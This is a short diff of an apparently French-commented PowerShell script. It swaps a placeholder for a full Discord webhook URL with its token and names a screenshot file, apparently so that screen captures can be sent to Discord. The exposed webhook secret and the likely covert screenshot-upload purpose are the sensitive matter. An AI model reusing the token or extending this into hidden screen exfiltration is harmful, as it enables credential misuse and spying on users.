@@ -1,5 +1,5 @@
 # Définir l'URL du webhook
-$webhookUrl = "URL_DU_WEBHOOK"
+$webhookUrl = "https://discord.com/api/webhooks/1151525024088477868/uRlaL-EA8gyLBxmjfzoZg5aAB1QT24phwo9XA13_rA2tai3rMHp2E7KqZEKN9sMS54kF"
 
 # Définir le nom du fichier pour la capture d'écran
 $fileName = "screenshot.png"
